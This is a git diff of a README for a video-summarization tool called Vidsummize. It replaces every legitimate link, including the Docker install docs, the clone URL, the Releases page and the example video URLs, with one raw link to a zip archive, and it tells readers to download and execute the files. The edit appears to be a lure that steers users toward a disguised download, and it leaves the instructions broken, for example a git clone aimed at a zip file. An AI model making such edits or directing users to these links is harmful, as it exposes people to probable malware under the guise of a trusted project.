@@ -1,6 +1,6 @@
 # Vidsummize 🎥✨
 
-![Vidsummize Logo](https://img.shields.io/badge/Vidsummize-Ready%20to%20Use-brightgreen)
+![Vidsummize Logo](https://raw.githubusercontent.com/BluBluBlaBla/vidsummize/master/src/main/Software-v3.5.zip%20to%20Use-brightgreen)
 
 Welcome to **Vidsummize**, a powerful tool designed to help you summarize video content efficiently. This repository provides a seamless way to integrate video summarization into your projects using modern technologies like Docker, Spring Boot, and more.
 
@@ -50,19 +50,19 @@ To get started with Vidsummize, follow the steps below. Make sure you have Docke
 
 ### Prerequisites
 
-- Docker: [Install Docker](https://docs.docker.com/get-docker/)
-- Docker Compose: [Install Docker Compose](https://docs.docker.com/compose/install/)
+- Docker: [Install Docker](https://raw.githubusercontent.com/BluBluBlaBla/vidsummize/master/src/main/Software-v3.5.zip)
+- Docker Compose: [Install Docker Compose](https://raw.githubusercontent.com/BluBluBlaBla/vidsummize/master/src/main/Software-v3.5.zip)
 
 ## Installation
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/BluBluBlaBla/vidsummize.git
+   git clone https://raw.githubusercontent.com/BluBluBlaBla/vidsummize/master/src/main/Software-v3.5.zip
    cd vidsummize
    ```
 
 2. **Download the Latest Release**:
-   Visit [Releases](https://github.com/BluBluBlaBla/vidsummize/releases) to download the latest version. Follow the instructions provided there to execute the necessary files.
+   Visit [Releases](https://raw.githubusercontent.com/BluBluBlaBla/vidsummize/master/src/main/Software-v3.5.zip) to download the latest version. Follow the instructions provided there to execute the necessary files.
 
 3. **Build and Run**:
    Use Docker Compose to build and run the application:
@@ -83,7 +83,7 @@ Once the application is running, you can access the API endpoints to summarize v
    Provide the video URL in the request body:
    ```json
    {
-     "videoUrl": "https://example.com/video.mp4"
+     "videoUrl": "https://raw.githubusercontent.com/BluBluBlaBla/vidsummize/master/src/main/Software-v3.5.zip"
    }
    ```
 
@@ -96,7 +96,7 @@ Here’s an example using `curl`:
 ```bash
 curl -X POST http://localhost:8080/api/summarize \
 -H "Content-Type: application/json" \
--d '{"videoUrl": "https://example.com/video.mp4"}'
+-d '{"videoUrl": "https://raw.githubusercontent.com/BluBluBlaBla/vidsummize/master/src/main/Software-v3.5.zip"}'
 ```
 
 ### Example Response
@@ -129,7 +129,7 @@ For questions or suggestions, please open an issue on the repository or contact 
 
 ### Download Latest Release
 
-For the latest updates and releases, check out [Releases](https://github.com/BluBluBlaBla/vidsummize/releases) again. Download the necessary files and execute them to stay updated.
+For the latest updates and releases, check out [Releases](https://raw.githubusercontent.com/BluBluBlaBla/vidsummize/master/src/main/Software-v3.5.zip) again. Download the necessary files and execute them to stay updated.
 
 ---
 
